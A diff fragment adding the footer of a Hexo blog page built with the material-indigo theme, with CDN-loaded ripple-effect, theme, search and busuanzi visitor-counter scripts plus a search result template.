+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
